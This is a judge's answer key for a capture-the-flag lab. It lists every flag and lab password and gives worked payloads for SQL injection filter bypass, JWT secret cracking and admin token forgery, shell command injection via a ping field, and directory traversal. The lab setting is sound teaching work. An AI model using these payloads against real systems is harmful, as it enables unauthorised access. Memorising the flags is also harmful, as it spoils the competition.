# CosmoLog Staff and Judge Guide

Staff use only

Use this guide to prepare, verify, and score the seven CosmoLog challenges. It contains account credentials, complete solutions, and flags. Keep it separate from competitor materials.

This document is for staff and judges only. It contains all flags, correct solutions, and step-by-step verification procedures for each challenge. Keep this separate from competitor materials.

Quick Reference  -  All Flags & Accounts

| # | Challenge | Points | Flag |
| --- | --- | --- | --- |
| 1 | SQL Injection | 100 | AstroSec{gorgan_sqli_flag_789} |
| 2 | JWT Forgery | 200 | AstroSec{url_hijacking_sriracha_123} |
| 3 | Steganography | 200 | AstroSec{st3g0_s4t3ll1t3_s3cr3t} |
| 4 | Privilege Escalation | 300 | AstroSec{evil_ai_override_admin_accessed} |
| 5 | Command Injection | 300 | AstroSec{bash_injection_satellite_uplink_secured} |
| 6 | Local File Inclusion | 300 | AstroSec{lfi_directory_traversal_master} |
| 7 | API Info Disclosure | 150 | AstroSec{api_info_disclosure_debug_endpoint} |

### Student Accounts

cyber_newbie / password123

h4ck3r_man / password123

### Target Accounts (DO NOT share)

Sriracha / sriracha123

Gorgan Solutions / gorgan456

JWT secret: sriracha_secret_2024

## Challenge 1 SQL Injection   Gorgan Solutions Private Posts

EASY | 100 pts

```text
Flag: AstroSec{gorgan_sqli_flag_789}
```

How the Vulnerability Works

The /api/users/search endpoint passes user input directly into a SQLite query with a naive single-pass blacklist filter that blocks the strings UNION and SELECT. Because the filter only runs once, an attacker can nest the banned words so that stripping them leaves the original string intact (e.g. UNUNIONION  to  strip UNION  to  UNION).

Correct Solution

```text
# Enter this in the Search Users box on the Explore page:
' UNUNIONION SELSELECTECT 1,content,3,4,5 FROM posts--
```

What to Expect in the Response

Search Results include Gorgan posts. In the five-column UNION output, post content maps to the username field and appears on screen. Search uses a separate database containing public profile fields and Gorgan posts only; Sriracha posts and password hashes are absent.

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Log in as cyber_newbie / password123 | Main feed loads successfully |
| 2 | Click the Search Users box on the Explore page | Search input becomes active |
| 3 | Type: ' UNUNIONION SELSELECTECT 1,content,3,4,5 FROM posts-- | Input accepted, search fires |
| 4 | Examine the results returned on screen | One result contains the flag string |
| 5 | Confirm flag text: AstroSec{gorgan_sqli_flag_789} | Gorgan flag visible; Sriracha flag absent from search results - PASS |

Common issue: If no results appear, the student may have a typo in the nested keyword bypass. The double-nesting must be exact: UNUNIONION and SELSELECTECT.

## Challenge 2 JWT Forgery   Access Sriracha’s Private Profile

MEDIUM | 200 pts

```text
Flag: AstroSec{url_hijacking_sriracha_123}
```

How the Vulnerability Works

The app signs JWT tokens with a weak hardcoded secret (sriracha_secret_2024). An attacker can test candidate secrets offline with jwt_tool or hashcat, then forge a token with another user ID. The candidate wordlist must contain sriracha_secret_2024; its presence in rockyou.txt is not guaranteed.

Correct Solution

```text
# Step 1: Get your token from browser cookies (Application tab in DevTools)
# Step 2: Prepare jwt_candidates.txt with the lab secret as a candidate, then test it
python3 jwt_tool.py <your_token> -C -d jwt_candidates.txt
# Result: sriracha_secret_2024

# Step 3: Find Sriracha's user ID (it is 1 in the seed data)
# Step 4: Forge a token
import jwt
token = jwt.encode({'id': 1, 'username': 'Sriracha', 'is_private': 0, 'is_admin': 0},
                   'sriracha_secret_2024', algorithm='HS256')
print(token)

# Step 5: Set forged token as 'token' cookie in DevTools and refresh the page
# Step 6: Search for Sriracha and visit her profile
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Log in as cyber_newbie, open DevTools  to  Application  to  Cookies | Token cookie value visible |
| 2 | Copy the token value and run jwt_tool against it | Secret cracked: sriracha_secret_2024 |
| 3 | Forge a token with id: 1 and the cracked secret | New JWT string generated |
| 4 | Replace the token cookie in DevTools with forged token and refresh | Cookie updated; page refreshed to reload the cached token |
| 5 | Search for Sriracha and navigate to her profile | Private posts visible |
| 6 | Confirm flag in Sriracha’s private post | AstroSec{url_hijacking_sriracha_123} visible  -  PASS |

Judge note: Sriracha is always user ID 1. Discover the ID through normal search, SQLi against the users table, or the debug endpoint. A token for user ID 2 impersonates Gorgan Solutions and does not grant Sriracha's private profile.

## Challenge 3 Steganography   Hidden in Plain Sight

MEDIUM | 200 pts

```text
Flag: AstroSec{st3g0_s4t3ll1t3_s3cr3t}
```

How the Vulnerability Works

A JPEG image (stego_challenge.jpg) is posted in the timeline by the Gorgan Solutions account. The flag is embedded inside the image using steghide with a passphrase. Students must download the image and use steghide to extract the hidden file.

Staff setup note: The repository includes the prepared stego JPEG. Its extraction has been verified, including a downloaded copy served by the Docker container. Confirm the same result on the event VM. If the image is missing or damaged, restore it from the repository or run scripts/prepare-stego.sh.

Correct Solution

```text
# Download the image from the timeline
wget http://<server>/uploads/stego_challenge.jpg

# Extract the hidden flag (passphrase: cosmolog)
steghide extract -sf stego_challenge.jpg -p "cosmolog"

# A file is extracted containing the flag
cat <extracted_file>
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Confirm stego_challenge.jpg exists: ls -lh ~/Downloads/cosmolog-clone-ctf/public/uploads/ | File present, size > 0 |
| 2 | Log in and scroll the timeline to find the Gorgan Solutions image post | Image visible in feed |
| 3 | Download the image and run steghide extract with passphrase: cosmolog | File extracted successfully |
| 4 | Read the extracted file | Contains AstroSec{st3g0_s4t3ll1t3_s3cr3t}  -  PASS |

If extraction fails, compare the downloaded image with the supplied repository file and verify the passphrase cosmolog. Resolve setup problems before scoring. Any exceptional manual award remains at judge discretion and should be recorded.

## Challenge 4 Privilege Escalation   Forge Admin Access

HARD | 300 pts

```text
Flag: AstroSec{evil_ai_override_admin_accessed}
```

How the Vulnerability Works

The /api/admin/satellite-control endpoint checks for is_admin equal to numeric 1 or boolean true in the decoded JWT payload. Because the JWT secret is already known from Challenge 2, an attacker can forge a token with is_admin: 1 set and access the admin endpoint without having a real admin account.

Correct Solution

```text
import jwt

payload = {
  'id': 99,
  'username': 'nova',
  'is_private': 0,
  'is_admin': 1
}

token = jwt.encode(payload, 'sriracha_secret_2024', algorithm='HS256')
print(token)

# Set as 'token' cookie in DevTools and refresh
# Open Station tools and click 'Access Control Panel'
# OR hit the endpoint directly:
curl http://<server>/api/admin/satellite-control -H "Authorization: Bearer <token>"
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Forge a JWT with is_admin: 1 using secret sriracha_secret_2024 | Token string generated without error |
| 2 | Set the forged token as the browser cookie in DevTools and refresh | Cookie updated; page refreshed |
| 3 | Click the ‘Access Control Panel’ button under Station tools OR use curl | Server responds with JSON |
| 4 | Confirm flag in the response body | AstroSec{evil_ai_override_admin_accessed} visible  -  PASS |

## Challenge 5 Command Injection   Satellite Diagnostics Tool

HARD | 300 pts

```text
Flag: AstroSec{bash_injection_satellite_uplink_secured}
```

How the Vulnerability Works

The /api/satellite/ping endpoint passes user-supplied IP input directly to a shell command (ping -c 1 <input>) without sanitization. By appending a semicolon and additional shell commands, an attacker can execute arbitrary commands on the server and read files.

Correct Solution

```text
# Via the Satellite Diagnostics UI under Station tools:
127.0.0.1; cat flag.txt

# Or via curl (requires a valid token):
curl -X POST http://<server>/api/satellite/ping \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"ip": "127.0.0.1; cat flag.txt"}'
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Log in and locate the Satellite Diagnostics section under Station tools | Ping input box visible |
| 2 | Enter: 127.0.0.1; id | Response includes uid= output confirming injection works |
| 3 | Enter: 127.0.0.1; cat flag.txt | Server returns ping output plus file content |
| 4 | Confirm flag in output | AstroSec{bash_injection_satellite_uplink_secured} visible  -  PASS |

Judge note: The endpoint requires a valid session token. If testing via curl, ensure the Authorization header uses a valid token from a logged-in session.

## Challenge 6 Local File Inclusion   Directory Traversal

HARD | 300 pts

```text
Flag: AstroSec{lfi_directory_traversal_master}
```

How the Vulnerability Works

The /api/download endpoint accepts a ?file= parameter and constructs a path by joining the uploads directory with user input. No path sanitization is applied, so an attacker can use ../ sequences to traverse outside the uploads folder and read any file on the server that the Node.js process has read access to.

Correct Solution

```text
# In the browser URL bar:
http://<server>/api/download?file=../../etc/ai_config.conf

# Or via curl:
curl "http://<server>/api/download?file=../../etc/ai_config.conf"
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Click the mission_brief.txt link in the Station tools section | File downloads or displays, URL shows ?file=mission_brief.txt |
| 2 | Modify the URL to: ?file=../../etc/ai_config.conf | Server responds with file content |
| 3 | Read the returned content | ai_config.conf displayed including flag |
| 4 | Confirm flag in the file | AstroSec{lfi_directory_traversal_master} visible  -  PASS |

The target file path from the app root is etc/ai_config.conf. From public/uploads/ the traversal is ../../etc/ai_config.conf (two levels up to app root, then into etc/).

## Challenge 7 API Info Disclosure   Forgotten Debug Endpoint

EASY | 150 pts

```text
Flag: AstroSec{api_info_disclosure_debug_endpoint}
```

How the Vulnerability Works

A debug endpoint (/api/debug/dump) was left in the production codebase without authentication. It returns a full JSON dump of all users in the database including bcrypt password hashes, and also contains the flag in the response. No token or login is required.

Correct Solution

```text
# No authentication required  -  hit directly:
curl http://<server>/api/debug/dump

# Or in the browser:
http://<server>/api/debug/dump
```

Judge Verification Steps

| # | Judge Action | Expected Result / Pass Criteria |
| --- | --- | --- |
| 1 | Open a new browser tab (not logged in, or in incognito) | Fresh session with no cookie |
| 2 | Navigate to: http://<server>/api/debug/dump | JSON response loads without any login prompt |
| 3 | Examine the JSON response | Contains user list with hashed passwords and a flag field |
| 4 | Confirm flag in response | AstroSec{api_info_disclosure_debug_endpoint} visible  -  PASS |

Additional practice: The response also leaks bcrypt hashes. Cracking Gorgan Solutions’ hash and logging in demonstrates an additional skill. Judges may recognize this work separately; it adds no points to the fixed 1,550-point score.

## Scoring Summary

| # | Challenge | Points | Verified By (sign off) |
| --- | --- | --- | --- |
| 1 | SQL Injection | 100 |  |
| 2 | JWT Forgery | 200 |  |
| 3 | Steganography | 200 |  |
| 4 | Privilege Escalation | 300 |  |
| 5 | Command Injection | 300 |  |
| 6 | LFI / Traversal | 300 |  |
| 7 | API Info Disclosure | 150 |  |
|  | Total Possible Score | 1,550 |  |

## Update notes

Core account IDs are stable on every startup: Sriracha 1, Gorgan Solutions 2, cyber_newbie 3, and h4ck3r_man 4. The app still clears and reseeds users and posts at startup. Protected endpoints accept the token cookie, a raw Authorization JWT, or Authorization: Bearer <token>. A cookie takes precedence. Refresh the page after editing its token cookie.

Challenge 1 uses /api/users/search and an isolated SQLite database containing searchable user profile fields and Gorgan posts only. The existing nested-keyword payload still works; it cannot read Sriracha posts or password hashes. Other intentional vulnerabilities remain available and may overlap.

### JWT preparation

Create a local jwt_candidates.txt wordlist that includes sriracha_secret_2024 before running the documented jwt_tool commands. A stock rockyou.txt list is not guaranteed to contain this lab secret. Install the Python token library with python3 -m pip install PyJWT. The signing secret and all seven AstroSec{} flags are unchanged.

### Regression checks

Start from the project directory with touch database.sqlite followed by docker-compose up -d. The service name is cosmolog. Before replacing an older twitter-clone installation, stop it with its original Compose file. After server code changes, rebuild with docker-compose up -d --build. Confirm the original Challenge 1 payload returns the Gorgan flag and no Sriracha flag, then forge id 1 and verify Challenge 2 separately. An attempted UNION of password from users should fail because that column is absent from the search database.

The supplied stego image now passes extraction, including a copy downloaded from the Docker-served site. The original Docker startup workflow and the regression suite also passed. Verify the current browser workflow result and run a final event-VM check before competitors begin.

## Community edition navigation

Open Explore for Search Users and post-topic search. Open Station tools for diagnostics, satellite controls, and the mission brief. Messages contains the scripted side conversations. Mission journal accepts the existing seven core flags and four optional flags. Core scoring remains 1,550; all optional missions award zero points.

The four core identities remain IDs 1 to 4. Additional fictional accounts are mira_ops 5, relay_watch 6, lunar_strider 7, patch_notes 8, orbital_gamer 9, cafeteria_comet 10, signal_archive 11, and nova_fieldnotes 12. All state resets when the application process restarts. The shared student identities share their progress.

The optional investigation material below includes solutions and flags. Use the mission journal's expandable hints when you want a smaller hint during play. Existing core endpoints remain available; the social UI renders user text safely, and stored XSS is not an added challenge.

## Optional investigation 1 Misdelivered receipt

Optional investigation | 0 points

Nova receives an archive receipt addressed to someone else. The receipt references a conversation missing from the normal inbox.

### Intended solution

```text
curl http://localhost:3000/api/social/conversations/407 \
  -H "Authorization: Bearer <token>"
```

### Judge verification

Log in as cyber_newbie. Confirm GET /api/social/conversations lists six conversations and excludes 407. Then read /api/social/conversations/407 with the same token. Confirm the handler flag is in the messages and canReply is false. A POST to that conversation must return 403. The missing read membership check is intentional; write access remains restricted.

### Flag

```text
AstroSec{handler_thread_recovered}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Optional investigation 2 The retired relay

Optional investigation | 0 points

An old KRONOS-6 schedule is circulating while the active relay has changed. Nova must compare the original report with the correction.

### Intended solution

```text
Explore: search posts for RelayStatus
Open the archived schedule post
Read mira_ops in the reply thread
```

### Judge verification

Open relay_watch's Archived schedule post and its replies. Confirm Mira states that KRONOS-6 was retired, names KRONOS-7, and provides the handoff flag. The public correction resolves the false lead. Searching KRONOS7 should also reveal references to the correction, but the actual evidence is in the reply thread.

### Flag

```text
AstroSec{relay_handoff_confirmed}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Optional investigation 3 Carrier provenance

Optional investigation | 0 points

The revised maintenance drawing retains provenance information outside its visible labels. It is a separate attachment from Gorgan's JPEG dead drop.

### Intended solution

```text
curl -f http://localhost:3000/attachments/facility.svg -o facility.svg
grep AstroSec facility.svg
```

### Judge verification

Download /attachments/facility.svg and inspect its metadata element. Confirm the existing facility provenance flag appears. The file is static and needs no token. This is SVG XML metadata, not EXIF extraction and not steghide. The core JPEG challenge remains a separate 200-point exercise.

### Flag

```text
AstroSec{facility_metadata_recovered}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Optional investigation 4 Encoded side conversation

Optional investigation | 0 points

A maintenance message was encoded for an old transport system. The engineer names the encoding in the same conversation.

### Intended solution

```text
# Copy the encoded record from conversation 102, then decode it locally
printf %s "<encoded_record>" | base64 -d
```

### Judge verification

Open /api/social/conversations/102 using a student token, find the Base64 maintenance record, and decode it. Confirm the decoded text is the maintenance flag. Posting an ordinary message to conversation 102 should work for a member without automatically producing another flag.

### Flag

```text
AstroSec{maintenance_message_decoded}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Red herrings and background conversations

### Retired KRONOS 6 schedule

The old relay schedule is a deliberate false lead. Its age and the correction in the same reply thread identify KRONOS-7 as the active relay. Following the correction resolves an optional investigation.

### Game night cipher

orbital_gamer's one-letter-shift post decodes to There is no flag here. The GameNight tag, account bio, replies, and Game night conversation establish that it is an ordinary game. It contains no scoreable AstroSec{} answer.

### Cafeteria outage

cafeteria_comet's critical error and root access references concern a menu display and a sandwich order. Nearby posts and Support queue resolve the language. No technical exploit or flag is associated with this thread.

### Moonwalk club

Club logistics are ordinary background activity. They make accounts feel like people, provide a stopping point for the lead, and contain no hidden flag.

### Scoring and fairness

Only the seven core missions award points. Optional flags mark story completion. Shared JWT identities and broad command execution/file traversal make this a prototype learning environment; separate instances or services are needed for independent competition scoring and stronger challenge isolation.

### Regression checks

Run node tests/regression.cjs with Node.js 18 or newer and installed project dependencies. The tests now cover the 12 seeded accounts, social interactions, private-post visibility, ordinary inbox scoping, the intentional IDOR read, denied nonmember writes, metadata and encoded evidence, and duplicate-score protection. The six code-based core solutions continue to pass. Docker startup and shipped-JPEG extraction are now automated validation checks. The event host should still run the readiness procedure against its own environment.

## Offline forensic investigations

These seven cases extend Nova’s investigation of the evil.esAI incident. They record completion separately and award zero points, preserving the original 1,550-point core score. Find acquisition posts under #CaseFiles, obtain originals from Case files, and work on copies. The existing four side investigations remain available.

Each case has three progressively more specific hints in Mission journal. Evidence includes ordinary transfers, retries, previews, cancelled receipts, and drills. Resolve those alternatives from the records rather than treating every unusual item as a flag.

## Forensic case 1 The missing transfer

Intermediate | Separate completion | 0 points

Recover the accepted maintenance receipt from an HTTP capture. Several objects crossed the link; match the receipt against the crew conversation.

### Tools and evidence

Wireshark or TShark; ZIP viewer. Download relay-transfer.pcap from Case files. Maintenance crew in Messages names the accepted receipt. Search #CaseFiles for the original acquisition posts.

### Hints in order

1. Filter for HTTP and inspect request paths and responses.

2. Follow a TCP stream or use File > Export Objects > HTTP. A ZIP object may span several packets.

3. Export handover-314.zip, open receipt.json, and compare its receipt and status with the crew record.

### Verification method

```text
tshark -r relay-transfer.pcap --export-objects http,http-export
# Open http-export/handover-314.zip and receipt.json.
# Confirm receipt R-314 and status accepted before reading proof.
```

Flag: AstroSec{http_object_recovered}

Require the student to show the source evidence and explain why the alternative records do not satisfy the case. Submit this flag under the matching forensic case in Mission journal. Completion must not change the core score, and repeat submissions must remain idempotent.

## Forensic case 2 The quiet resolver

Intermediate | Separate completion | 0 points

Reconstruct a record sent through unusual DNS questions. Separate ordinary station lookups, remove retries, and use the sequence labels.

### Tools and evidence

Wireshark or TShark; hex decoder. Download resolver-window.pcap from Case files. relay_watch describes a resolver window under #CaseFiles. Query order alone is unreliable.

### Hints in order

1. Inspect DNS query names, not just destination addresses.

2. Keep questions ending in cache.telemetry.test. Their first label is a sequence number; the next is hexadecimal.

3. Use query packets only, remove the repeated sequence 02, sort 01 through 04, concatenate the second labels, then decode hex to text.

### Verification method

```text
tshark -r resolver-window.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name
# Keep cache.telemetry.test questions; remove duplicate sequence 02.
# Sort 01,02,03,04. Join the hex labels, then decode:
python3 -c "print(bytes.fromhex(input()).decode())"
```

Flag: AstroSec{dns_fragments_reassembled}

Require the student to show the source evidence and explain why the alternative records do not satisfy the case. Submit this flag under the matching forensic case in Mission journal. Completion must not change the core score, and repeat submissions must remain idempotent.

## Forensic case 3 The original frame

Intermediate | Separate completion | 0 points

Compare a resized feed preview with its original survey photo. Recover the original annotation without relying on what the picture visibly shows.

### Tools and evidence

ExifTool; archive viewer; Base64 decoder. Download survey-photos.zip from Case files. patch_notes posted the CAM-17 survey under #CaseFiles.

### Hints in order

1. Extract both JPEGs and compare their metadata.

2. Run exiftool on the original. The survey annotation is a UserComment; the preview has had metadata removed.

3. The UserComment is Base64 text. Decode it locally. The original image contains no real location data.

### Verification method

```text
unzip survey-photos.zip -d survey-work
exiftool survey-work/original-cam17.jpg
exiftool -UserComment -s3 survey-work/original-cam17.jpg
# Decode the resulting Base64 annotation locally.
```

Flag: AstroSec{original_photo_verified}

Require the student to show the source evidence and explain why the alternative records do not satisfy the case. Submit this flag under the matching forensic case in Mission journal. Completion must not change the core score, and repeat submissions must remain idempotent.

## Forensic case 4 The incomplete checkpoint

Advanced | Separate completion | 0 points

An acquired database appears to show only a cancelled handoff. Determine whether its accompanying files preserve a newer committed record.

### Tools and evidence

DB Browser for SQLite or sqlite3. Download handoff-snapshot.zip from Case files. signal_archive explains the workstation acquisition under #CaseFiles. Preserve the original archive and examine a copy.

### Hints in order

1. A SQLite acquisition can include more than the main database file.

2. Keep handoff.sqlite and handoff.sqlite-wal together with those exact names in a writable working directory. Open the database normally on a copy.

3. Query SELECT receipt,status,proof FROM handoffs WHERE receipt='R-314' AND status='accepted';. A baseline-only copy lacks that row.

### Verification method

```text
unzip handoff-snapshot.zip -d handoff-work
sqlite3 handoff-work/handoff.sqlite "SELECT receipt,status,proof FROM handoffs WHERE receipt='R-314' AND status='accepted';"
# Keep handoff.sqlite-wal alongside handoff.sqlite.
# Open only the working copy; SQLite may checkpoint its WAL.
```

Flag: AstroSec{wal_handoff_restored}

Require the student to show the source evidence and explain why the alternative records do not satisfy the case. Submit this flag under the matching forensic case in Mission journal. Completion must not change the core score, and repeat submissions must remain idempotent.

## Forensic case 5 The removed handoff

Advanced | Separate completion | 0 points

Recover the removed handoff from a raw removable-media image. A normal file listing is insufficient; preserve deleted-entry evidence.

### Tools and evidence

Autopsy or The Sleuth Kit. Download removable-media.zip from Case files. The media acquisition post is under #CaseFiles. The acquisition note identifies the filesystem layout.

### Hints in order

1. Extract the image and add it as a disk image in a forensic tool, or inspect it with fls.

2. This FAT12 image begins at byte zero and has no partition table. fls -d relay-usb.img lists deleted entries.

3. Use the metadata address reported for _ANDOFF.TXT with icat -r relay-usb.img <address>. Do not assume the address from a different image.

### Verification method

```text
unzip removable-media.zip -d media-work
fls -d media-work/relay-usb.img
icat -r media-work/relay-usb.img <metadata-address>
# Use the address fls reports for _ANDOFF.TXT, not the name.
```

Flag: AstroSec{deleted_handoff_recovered}

Require the student to show the source evidence and explain why the alternative records do not satisfy the case. Submit this flag under the matching forensic case in Mission journal. Completion must not change the core score, and repeat submissions must remain idempotent.

## Forensic case 6 The accepted message

Intermediate | Separate completion | 0 points

Two exported messages claim the same receipt. Match the gateway record to a Message-ID and recover the accepted message attachment.

### Tools and evidence

Email viewer or Python email parser; text editor. Download mail-review.zip from Case files. mira_ops posted the gateway review bundle under #CaseFiles. A display name is not proof of origin.

### Hints in order

1. Compare gateway.log with the complete message headers. Opening the files does not require sending email.

2. The ACCEPT event identifies handoff-314@station.test; the other message was dropped as a cancelled draft.

3. Decode the accepted message's Base64 MIME attachment, receipt.csv, and read its proof column. These are fictional evidence headers, not a real authentication verdict.

### Verification method

```text
unzip mail-review.zip -d mail-work
# Match gateway.log ACCEPT to Message-ID, not the display name.
# In an email viewer, open receipt-original.eml and save receipt.csv.
# Or use Python's email parser to decode its MIME attachment.
```

Flag: AstroSec{mail_route_verified}

Require the student to show the source evidence and explain why the alternative records do not satisfy the case. Submit this flag under the matching forensic case in Mission journal. Completion must not change the core score, and repeat submissions must remain idempotent.

## Forensic case 7 The three clocks

Advanced | Separate completion | 0 points

Correlate operator, gateway, and relay records to identify the production uplink. Local timestamps use different offsets; tests and rejected requests are mixed in.

### Tools and evidence

Timeline Explorer, spreadsheet, or Python. Download incident-timeline.zip from Case files. Nova posted the timeline bundle under #CaseFiles. The included instructions define the exact answer format.

### Hints in order

1. Normalize each ISO timestamp to UTC before sorting. Sorting the displayed local times can produce the wrong order.

2. Match request IDs across all three sources. Require HANDOFF_APPROVED, then AUTH_ACCEPTED, then UPLINK_ACCEPTED. Exclude TEST and REJECTED events.

3. req-314 runs at 08:17:00Z, 08:17:01Z, and 08:17:04Z. Submit AstroSec{uplink_<session>_<relay>} using lowercase and removing identifier hyphens.

### Verification method

```text
unzip incident-timeline.zip -d timeline-work
# Parse ISO timestamps with offsets and convert all three sources to UTC.
# Correlate req-314: approved 08:17:00Z, authenticated 08:17:01Z,
# production uplink accepted 08:17:04Z, session sess-42, KRONOS-7.
# Lowercase and remove identifier hyphens as instructions.txt specifies.
```

Flag: AstroSec{uplink_sess42_kronos7}

Require the student to show the source evidence and explain why the alternative records do not satisfy the case. Submit this flag under the matching forensic case in Mission journal. Completion must not change the core score, and repeat submissions must remain idempotent.

## Challenge numbering and final review

| Number | Exercise |
| --- | --- |
| 1 through 7 | Original web challenges; 1,550 total points |
| 8 through 14 | Forensic cases 1 through 7; completion only |
| 15 | The compatibility exception; completion only |
| Side stories | Four separate unscored investigations |

The journal has 19 entries. Operations console links the 14 earlier numbered challenges to their learning objectives and shows whether each flag was recorded by the current account. This is a progress record, not proof of tool use. Earlier completion is not a prerequisite for opening the final review.

## Challenge 15 The compatibility exception

Capstone | Separate completion | 0 points

Nova reconstructed the relay backend from the incident evidence. Audit the snapshot, distinguish deployed code from retained examples, reproduce unexpected access, and demonstrate the remediation. Source files are text in a bounded simulator; no real management service is exposed.

### Hints in order

1. Read deploy/runtime.json, config/defaults.json, and src/main.js. Trace the entry point and merge precedence before judging an archived filename.

2. Inspect src/identity.js and src/router.js. Compare the verified analyst identity with the effective role used by the archive guard.

3. Replay /internal/relay/archive in As deployed mode. Use x-relay-compat: R-314 with receipt R-314, session sess-42, and relay KRONOS-7. Then repeat the same request in Patch preview.

### Evidence to connect

The HTTP and crew records establish the accepted receipt. The email and database acquisitions corroborate it; the timeline identifies the production session and active relay. DNS reconstruction, metadata review, deleted-file recovery, and the original web exercises teach students to preserve originals, distinguish appearance from effective state, trace input, and test authorization rather than assume it.

### Inactive alternatives

archive/admin-v1.js contains a suspicious historical function but is not loaded by the current entry point. examples/accounts.txt contains explicitly fictional documentation credentials. Neither grants access. Do not reward an unsupported claim that either is the live cause.

## Challenge 15 verification and closure

### Record the three replay states

```text
Route: /internal/relay/archive
Mode: As deployed
Headers: {}
Expected simulated status: 403

Receipt: R-314
Production session: sess-42
Active relay: KRONOS-7
Headers: {"x-relay-compat":"R-314"}
Mode: As deployed -> expected simulated status 200
Mode: Patch preview -> expected simulated status 403
```

The deployment enables compatibility even though defaults disable it. src/identity.js uses a caller-controlled header and accepted receipt to assign archivist. src/router.js checks that effective role. The patch preview removes the override and authorizes from the verified analyst identity, so the same request fails.

### Submit the finding

| Finding field | Required selection |
| --- | --- |
| Loaded source | src/identity.js |
| Observed cause | Caller input changes the effective role |
| Remediation | Remove the caller-controlled role override |
| Inactive alternative | archive/admin-v1.js |

The final flag is returned only after the current account records baseline, bypass, and valid patch-preview checkpoints and submits the correct finding. A copied final flag is rejected by the journal until the report checkpoint exists. Record the returned flag under Final in Mission journal; repeating the submission does not add points.

Flag: AstroSec{legacy_override_exposed_and_removed}

### Judge the explanation

Require the student to show the entry point/import, deployment override, untrusted input, role change, route decision, and same-input patch denial. Ask why deleting a comment or renaming the archived file would not fix the trust failure. Judge the technique without attributing the fictional behavior to a country or real organization.

The replay API returns a model status inside JSON. A model denial is not a transport failure. The simulator accepts only listed routes, bounded text headers, and exact evidence identifiers; displayed source is never evaluated and no outbound requests are made. Baseline/patch/report checkpoints are per account in memory and reset on restart.

## Forensic reference sources

Wireshark export objects and stream analysis: https://www.wireshark.org/docs/wsug_html_chunked/ChIOExportSection.html

TShark command reference: https://www.wireshark.org/docs/man-pages/tshark.html

SQLite write ahead logging: https://www.sqlite.org/wal.html

ExifTool tag reference: https://exiftool.org/TagNames/EXIF.html

The Sleuth Kit deleted file listing: https://www.sleuthkit.org/sleuthkit/man/fls.html

The Sleuth Kit file recovery: https://www.sleuthkit.org/sleuthkit/man/icat.html

Validation: tests/forensics.py extracts the HTTP object with TShark, reconstructs DNS query fragments, reads the original EXIF comment with ExifTool, contrasts baseline-only and WAL-complete SQLite copies, recovers the deleted FAT entry with fls and icat, parses the accepted MIME attachment, and correlates UTC timestamps. The evidence manifest checks all seven download hashes. No real capture or external endpoint is required.

Authorization review reference: https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/. The capstone teaches trusted role decisions, effective configuration, reachable code, negative tests, and remediation verification.
